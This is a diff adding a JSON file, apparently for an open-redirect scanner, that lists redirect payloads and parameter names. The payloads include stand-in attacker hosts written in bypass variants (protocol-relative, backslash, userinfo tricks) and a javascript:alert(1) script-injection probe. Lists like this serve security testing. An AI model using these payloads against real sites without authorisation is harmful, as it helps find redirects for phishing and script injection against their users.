@@ -1,0 +1,32 @@
+{
+  "payloads": [
+    "https://evil.com",
+    "http://attacker.com",
+    "//evil.com",
+    "//evil.com/",
+    "///evil.com",
+    "////evil.com",
+    "https:evil.com",
+    "//google.com",
+    "javascript:alert(1)",
+    "/\\evil.com",
+    "https://evil.com@target.com"
+  ],
+  "parameters": [
+    "url",
+    "redirect",
+    "next",
+    "return",
+    "returnUrl",
+    "return_url",
+    "redirect_uri",
+    "continue",
+    "dest",
+    "destination",
+    "redir",
+    "redirect_url",
+    "checkout_url",
+    "goto",
+    "target"
+  ]
+}
